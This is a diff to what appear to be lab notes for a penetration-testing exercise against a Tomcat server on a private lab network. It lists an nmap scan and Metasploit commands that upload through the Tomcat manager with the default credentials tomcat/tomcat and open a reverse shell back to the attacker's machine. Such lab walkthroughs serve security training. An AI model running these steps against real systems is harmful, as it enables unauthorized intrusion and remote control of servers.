@@ -6,12 +6,17 @@ Scan to see open ports, detect running services, and detect service versions
 command: nmap -sV -sC -p- 192.168.56.101
 Look for 8180/tcp open http Apache Tomcat
 msfconsole
+search tomcat 5.5
 use exploit/multi/http/tomcat_mgr_upload
 set RHOST 192.168.56.101
 set RPORT 8180
+set LHOST 192.168.56.102
 show options
 show payloads
-set PAYLOAD java/jsp_shell_reverse_tcp
+set PAYLOAD java/shell_reverse_tcp
+set TARGETURI /manager
+set HttpUsername tomcat
+set HttpPassword tomcat
 exploit
 
 FUN FACT 
